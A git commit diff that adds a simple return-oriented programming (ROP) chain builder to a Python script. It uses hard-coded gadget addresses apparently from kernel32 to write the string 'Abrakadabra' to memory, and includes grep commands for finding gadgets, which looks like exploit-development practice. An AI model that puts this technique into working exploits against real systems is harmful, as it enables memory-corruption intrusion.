8ba4b02ed8e15dc3fb5e6cdbfd324b63f0e49bfd
Marcin Buchwald <marcin.buchwald@agora.pl>
2018-10-05 13:38:11 +0200

    [ADD] simplest ROP

--- ropchain_builder.py
+++ ropchain_builder.py
@@ -29,8 +29,52 @@ def rd(v):
 def rq(v):
   return unpack("<Q", v[:8])[0]
 
-f = open("ropchain.bin", "wb")
+# ROP targed dependent
+
+def set_rbx(v):
+  # 0x7ff9706bda36 pop rbx
+  # 0x7ff9706bda37 ret
+  return ''.join([
+    dq(0x7ff9706bda36),
+    dq(v)
+  ])
+
+def set_rcx(v):
+  # 0x7ff97069af87 pop rcx
+  # 0x7ff97069af88 ret
+  return ''.join([
+    dq(0x7ff97069af87),
+    dq(v)
+  ])
+
+def poke(ea, v):
+  # 0x7ff9706659da mov [rbx], rcx
+  # 0x7ff9706659dd ret
+  return ''.join([
+    set_rcx(v),
+    set_rbx(ea),
+    dq(0x7ff9706659da)
+  ])
+
+def poke_str(ea, s):
+  while len(s) % 8 != 0:
+    s += '\0'
+
+  o = []
+  for i in range(0, len(s), 8):
+    o.append(poke(ea + i, rq(s[i:i+8])))
+
+  return ''.join(o)
 
 # build payload
 
+rop = ''.join([
+  poke_str(0x18000000, "Abrakadabra")
+])
+
+f = open("ropchain.bin", "wb")
+f.write(rop)
 f.close()
+
+# grep -A 1 'pop r..' kernel32.rop | grep -B 1 'ret'
+# grep -A 1 'mov \[r..\], r..' kernel32.rop | grep -B 1 'ret'
